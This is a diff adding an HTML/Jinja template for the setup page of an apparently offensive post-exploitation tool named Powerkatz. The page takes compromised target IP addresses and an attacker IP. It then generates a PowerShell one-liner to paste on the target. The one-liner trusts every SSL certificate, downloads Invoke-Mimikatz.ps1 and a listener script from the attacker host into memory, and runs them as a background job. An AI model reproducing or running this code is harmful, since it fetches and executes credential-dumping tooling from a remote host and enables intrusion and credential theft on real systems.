@@ -1,0 +1,300 @@
+{% extends 'base/unauthenticated_base.html' %}
+{% block main %}
+<!-- success message -->
+<div id="succeed" class="mt-4 alert alert-success text-center pt-2 w-75 align-self-center" role="alert" style="display: none;">
+  <h4 class="alert-heading" id="succeedAlertHeading"></h4>
+  <p class="mb-0" id="succeedAlertPTag"></p>
+</div>
+<!-- failed message -->
+<div id="error" class="mt-4 alert alert-danger text-center pt-2 w-75 align-self-center" role="alert" style="display: none;">
+  <h4 class="alert-heading" id="failedAlertHeading"></h4>
+  <p class="mb-0" id="failedAlertPTag"></p>
+</div>
+<!-- pending message -->
+<div id="pending" class="mt-4 alert alert-info text-center pt-2 w-75 align-self-center" role="alert" style="display: none;">
+  <h4 class="alert-heading" id="pendingAlertHeading"></h4>
+  <p class="mb-0" id="pendingAlertPTag"></p>
+</div>
+
+<div class="text-end mt-3">
+  <a href="javascript:void(0)"><button type="button" class="btn btn-primary btn-sm" data-bs-toggle="modal" data-bs-target="#importSettingsModal">Import Settings</button></a>
+</div>
+
+<div oninput="displayInitateSession()">
+  <label for="targetIpAddress" class="card-title">Compromised Target IP Address(es):</label>
+  <input type="text" id="targetIpAddress" class="form-control mb-3" placeholder="Enter compromised target IP address(es) (e.g.: 10.0.0.5)">
+  <blockquote class="blockquote mb-0">
+    <p>Note: If you wish to have multiple compromised target IP addresses, you can use comma (<code>,</code>) or semicolon (<code>;</code>)<br>e.g.: <code>10.0.0.5,10.0.0.10;10.0.0.11</code></p>
+  </blockquote>
+  <label for="listenerPortNumber" class="card-title">Attacker IP Address: (Autofilled, Network Interface: {{ currentAppConfig['settings']['otherGeneralSettings']['attackerNetworkInterface'] }})</label>
+  <div class="input-group">
+    <div class="input-group-prepend w-75">
+      <input type="text" id="attackerIpAddress" class="form-control" value="{{ currentAppConfig['settings']['otherGeneralSettings']['attackerIpAddress'] }}" placeholder="Enter your attacker IP address here. (e.g.: 10.69.96.69)" disabled>
+    </div>
+    <button type="button" class="btn btn-secondary text-white w-25" onclick="updateAttackerIpAddress()">Update</button>
+  </div>
+</div>
+
+<div>
+  <div id="session">
+    <div id="selectSession" name="session" style="display: none;">
+      <h4 class="pb-2 my-4 text-danger border-bottom border-danger"><b id="targetSessionTitle"></b></h4>
+      <h5 class="card-title">Which Session Do You Want to Initiate?</h5>
+      <div onchange="displaySession()">
+        <div class="form-check">
+          <input class="form-check-input" type="radio" name="currentSession" id="shell" value="shell">
+          <label class="form-check-label" for="shell" id="currentSessionShellLabel">
+            Shell (including reverse, bind, WinRM, and other shells)
+          </label>
+        </div>
+        <div class="form-check">
+          <input class="form-check-input" type="radio" name="currentSession" id="rdpOrVnc" value="rdpOrVnc">
+          <label class="form-check-label" for="rdpOrVnc" id="currentSessionRdpOrVncLabel">
+            RDP/VNC
+          </label>
+        </div>
+      </div>
+
+      <!-- start of shell session -->
+      <div id="shellSession" style="display: none;">
+        <h6 class="card-title mb-2">Select Listener:</h6>
+        <select class="form-select mb-2" onchange="checkOptionOtherShell()" id="shellType">
+          <option value="Netcat/socat listener (reverse/bind shell)">Netcat/socat listener</option>
+          <option value="other">Others (e.g. Meterpreter, WinRM, webshell)</option>
+        </select>
+
+        <div id="controllableShellSession" class="mb-3">
+          <label for="listenerPortNumber" class="card-title">Enter the Listener's Port Number:</label>
+          <div class="input-group">
+            <div class="input-group-prepend w-50">
+              <span class="input-group-text" id="listenerPortNumberIpAddress" style="overflow-x: scroll;"></span>
+            </div>
+            <input type="number" name="listenerPortNumber" class="form-control" placeholder="Enter your listener port number (e.g.: 4444)">
+          </div>
+        </div>
+
+        <div id="otherShellSession" style="display: none;">
+          <h5 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Other Shell Session Instructions</b></h5>
+          <p>For other shell sessions, follow these steps:</p>
+          <ol>
+            <li>Launch a PowerShell terminal as Administrator/SYSTEM user if you're currently in the Command Prompt (cmd).</li>
+            <li>Copy the following PowerShell code and paste it into your PowerShell terminal to start the Powerkatz Server Listener:</li>
+          </ol>
+          <pre class="code"><code id="listenerCode" class="powershell mb-0"></code></pre>
+          <p>This PowerShell code will ignore the SSL certificate checking and download the Powerkatz Server Listener into memory. It will then start a background job that also ignores the SSL certificate checking and starts the listener. Finally, it will send a GET request to this web application to verify that the target server is up and running.<br><br>The reason why we need to ignore the SSL certificate checking is that this web application uses a self-signed SSL certificate.<br><br>After running the above PowerShell code, click the "Submit" button below to use the tool.</p>
+        </div>
+      </div>
+      <!-- end of shell session -->
+
+      <!-- start of RDP/VNC session -->
+      <div id="rdpOrVncSession" style="display: none;">
+        <h5 class="pb-2 my-4 text-danger border-bottom border-danger"><b>RDP/VNC Instructions</b></h5>
+        <div>
+          <p>For RDP/VNC sessions, follow these steps:</p>
+          <ol>
+            <li>Launch a PowerShell terminal as Administrator/SYSTEM user.</li>
+            <li>Copy the following PowerShell code and paste it into your PowerShell terminal to start the Powerkatz Server Listener:</li>
+          </ol>
+        </div>
+        <div class="d-flex justify-content-center">
+          <pre class="code"><code id="listenerCode" class="powershell"></code></pre>
+        </div>
+        <div class="d-flex flex-column mt-3 mb-0 align-items-start">
+          <p>
+            This PowerShell code will ignore the SSL certificate checking and download the Powerkatz Server Listener into memory. It will then start a background job that also ignores the SSL certificate checking and starts the listener. Finally, it will send a GET request to this web application to verify that the target server is up and running.
+            <br>
+            <br>
+            The reason why we need to ignore the SSL certificate checking is that this web application uses a self-signed SSL certificate.
+            <br>
+            <br>
+            After running the above PowerShell code, click the "Submit" button below to use the tool.
+          </p>
+        </div>
+      </div>
+      <!-- end of RDP/VNC session -->
+    </div>
+  </div>
+  <button id="submitButton" type="button" class="btn btn-danger w-100 border-danger fs-4 mt-2" onclick="registerParameters()" style="display: none;">Submit</button>
+</div>
+
+<!-- start of import settings modal -->
+<div class="modal fade modal-lg" id="importSettingsModal" tabindex="-1">
+  <div class="modal-dialog" id="importSettingsModalDialog">
+    <div class="modal-content">
+      <div class="modal-header" id="importSettingsModalHeader">
+        <h5 class="card-title" id="importSettingsModalTitle">Import Settings</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body" id="importSettingsModalBody">
+        <!-- success message -->
+        <div id="succeedModal" class="mt-3 alert alert-success text-center pt-3 w-100 align-self-center" role="alert" style="display: none;">
+          <h4 class="alert-heading" id="succeedAlertHeadingModal"></h4>
+          <p class="mb-0" id="succeedAlertPTagModal"></p>
+        </div>
+        <!-- failed message -->
+        <div id="errorModal" class="mt-3 alert alert-danger text-center pt-3 w-100 align-self-center" role="alert" style="display: none;">
+          <h4 class="alert-heading" id="failedAlertHeadingModal"></h4>
+          <p class="mb-0" id="failedAlertPTagModal"></p>
+        </div>
+        <!-- pending message -->
+        <div id="pendingModal" class="mt-4 alert alert-info text-center pt-2 w-100 align-self-center" role="alert" style="display: none;">
+          <h4 class="alert-heading" id="pendingAlertHeadingModal"></h4>
+          <p class="mb-0" id="pendingAlertPTagModal"></p>
+        </div>
+
+        <h5 class="card-title" id="importSettingsModalTitle">Select Settings JSON File:</h5>
+        <div class="input-group">
+          <input type="file" class="form-control" id="importSettingsFileInput" aria-describedby="importSettingsSubmitButton" aria-label="Upload" accept=".json,application/json">
+          <button class="btn btn-success" type="button" id="importSettingsSubmitButton" onclick="importSettings(this, isFromInitialSetup=true)">Submit</button>
+        </div>
+        <div class="border border-danger border-1 mt-4"></div>
+
+        <h4 class="pb-2 my-4 text-danger border-bottom border-danger"><b>Note for Importing RDP/VNC and "Other" Shell Session(s)</b></h4>
+        <p>Remember to set up the Powerkatz Server Listener first:</p>
+        <pre class="code"><code class="powershell" id="listenerCode">Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; $serverListenerString = "IEX (New-Object System.Net.Webclient).DownloadString('https://{ attackerIpAddress }/static/transferFiles/Invoke-Mimikatz.ps1')`n" + '$apiResponse = Invoke-RestMethod -UseBasicParsing -Uri https://{ attackerIpAddress }/api/getKeyIv' + [Environment]::NewLine + (New-Object System.Net.Webclient).DownloadString('https://{ attackerIpAddress }/static/transferFiles/Powerkatz_server.ps1'); Start-Job -Name ServerListener -ScriptBlock { Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; Invoke-Expression $using:serverListenerString }</code></pre>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end of import settings modal -->
+
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+  updateListenerCode();
+  displayInitateSession();
+});
+
+function escapeHtml(htmlStr) {
+   return htmlStr.replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#39;");
+}
+
+function updateListenerCode(){
+  var attackerIpAddress = document.getElementById("attackerIpAddress").value;
+  var escapedAttackerIpAddress = escapeHtml(attackerIpAddress);
+  var listenerCode = "Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; $serverListenerString = \"IEX (New-Object System.Net.Webclient).DownloadString('https://{ attackerIpAddress }/static/transferFiles/Invoke-Mimikatz.ps1')`n\" + '$apiResponse = Invoke-RestMethod -UseBasicParsing -Uri https://{ attackerIpAddress }/api/getKeyIv' + [Environment]::NewLine + (New-Object System.Net.WebClient).DownloadString(\"https://{ attackerIpAddress }/static/transferFiles/Powerkatz_server.ps1\"); Start-Job -Name ServerListener -ScriptBlock { Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; Invoke-Expression $using:serverListenerString }; Invoke-WebRequest -UseBasicParsing -Uri https://{ attackerIpAddress }/api/ping | Out-Null";
+  var updatedListenerCode = listenerCode.replace(/{ attackerIpAddress }/g, escapedAttackerIpAddress);
+
+  var listenerCodeElement = document.querySelectorAll("#listenerCode");
+  listenerCodeElement.forEach((element) => {
+    element.dataset.highlighted = "";
+    element.innerText = updatedListenerCode;
+    hljs.highlightElement(element);
+  });
+}
+
+function displayInitateSession() {
+  const targetIpAddress = document.getElementById("targetIpAddress").value;
+
+  const sessionDiv = document.getElementById("session");
+  const allSessionDivs = document.querySelectorAll("div[name=session]");
+  allSessionDivs.forEach((sessionDiv) => {
+    if (sessionDiv.id !== "selectSession") {
+      sessionDiv.remove();
+
+      var submitButton = document.getElementById("submitButton");
+      submitButton.style.display = "none";
+    }
+  });
+
+  if (!targetIpAddress) {
+    return;
+  }
+
+  updateListenerCode();
+
+  const selectSessionDiv = document.getElementById("selectSession");
+
+  var splitedTargetIpAddress = targetIpAddress.split(/[;,]/g);
+
+  splitedTargetIpAddress.forEach((targetIpAddress) => {
+    var selectSessionDiv = document.getElementById("selectSession");
+    var clonedSelectSessionDiv = selectSessionDiv.cloneNode(true);
+
+    clonedSelectSessionDiv.setAttribute("id", `selectSession-${targetIpAddress}`);
+    clonedSelectSessionDiv.setAttribute("data-targetIpAddress", targetIpAddress);
+    clonedSelectSessionDiv.style.display = "";
+
+    var clonedTargetSessionTitle = clonedSelectSessionDiv.querySelector("b[id=targetSessionTitle]");
+    clonedTargetSessionTitle.innerText = `Compromised Target IP Address: ${targetIpAddress}`;
+
+    var clonedShellCurrentSessionRadioButton = clonedSelectSessionDiv.querySelector("input[id=shell]");
+    var clonedRdpOrVncCurrentSessionRadioButton = clonedSelectSessionDiv.querySelector("input[id=rdpOrVnc]");
+    clonedShellCurrentSessionRadioButton.setAttribute("id", `shell-${targetIpAddress}`);
+    clonedShellCurrentSessionRadioButton.setAttribute("name", `currentSession-${targetIpAddress}`);
+    clonedRdpOrVncCurrentSessionRadioButton.setAttribute("id", `rdpOrVnc-${targetIpAddress}`);
+    clonedRdpOrVncCurrentSessionRadioButton.setAttribute("name", `currentSession-${targetIpAddress}`);
+
+    var clonedCurrentSessionShellLabel = clonedSelectSessionDiv.querySelector("label[id=currentSessionShellLabel]");
+    var clonedCurrentSessionRdpOrVncLabel = clonedSelectSessionDiv.querySelector("label[id=currentSessionRdpOrVncLabel]");
+    clonedCurrentSessionShellLabel.setAttribute("for", `shell-${targetIpAddress}`);
+    clonedCurrentSessionRdpOrVncLabel.setAttribute("for", `rdpOrVnc-${targetIpAddress}`);
+
+    var listenerPortNumberIpAddressSpan = clonedSelectSessionDiv.querySelector("span[id=listenerPortNumberIpAddress]");
+    listenerPortNumberIpAddressSpan.innerText = `Compromised Target IP Address ${targetIpAddress}:`
+
+    sessionDiv.appendChild(clonedSelectSessionDiv);
+  });
+
+  // create copy button for code blocks
+  createCopyButtonOnCodeBlocks();
+}
+
+// display which session, either "Shell" or "RDP/VNC"
+function displaySession() {
+  const targetIpAddress = document.getElementById("targetIpAddress").value;
+  var splitedTargetIpAddress = targetIpAddress.split(/[,;]/g);
+  splitedTargetIpAddress.forEach((targetIpAddress) => {
+    var clonedSelectSessionDiv = document.getElementById(`selectSession-${targetIpAddress}`);
+    var clonedShellSession = clonedSelectSessionDiv.querySelector("div[id=shellSession]");
+    var clonedRdpOrVncSession = clonedSelectSessionDiv.querySelector("div[id=rdpOrVncSession]");
+    var clonedCurrentSessionRadioButtons = document.querySelectorAll(`input[type="radio"][name="currentSession-${targetIpAddress}"]`);
+    var submitButton = document.getElementById("submitButton");
+
+    clonedCurrentSessionRadioButtons.forEach((radioButton) => {
+      if (radioButton.checked) {
+        if (radioButton.value === "shell") {
+          clonedShellSession.style.display = "";
+          clonedRdpOrVncSession.style.display = "none";
+        } else if (radioButton.value === "rdpOrVnc") {
+          clonedShellSession.style.display = "none";
+          clonedRdpOrVncSession.style.display = "";
+        }
+
+        submitButton.style.display = "";
+      }
+    });
+  });
+}
+
+function checkOptionOtherShell() {
+  const targetIpAddress = document.getElementById("targetIpAddress").value;
+  var splitedTargetIpAddress = targetIpAddress.split(",");
+  splitedTargetIpAddress.forEach((targetIpAddress) => {
+    var clonedSelectSessionDiv = document.getElementById(`selectSession-${targetIpAddress}`);
+    var clonedOtherShellSession = clonedSelectSessionDiv.querySelector("div[id=otherShellSession]");
+    var clonedShellTypeSelect = clonedSelectSessionDiv.querySelector("select[id=shellType]");
+    var clonedEnterListenerPortNumber = clonedSelectSessionDiv.querySelector("div[id=controllableShellSession]");
+
+    if (clonedShellTypeSelect.value === "other") {
+      clonedOtherShellSession.style.display = "";
+      clonedEnterListenerPortNumber.style.display = "none";
+    } else {
+      clonedOtherShellSession.style.display = "none";
+      clonedEnterListenerPortNumber.style.display = "";
+    }
+  });
+}
+
+function updateAttackerIpAddress() {
+  var attackerIpAddressInputBox = document.getElementById("attackerIpAddress");
+  attackerIpAddressInputBox.disabled = false;
+}
+</script>
+{% endblock %}
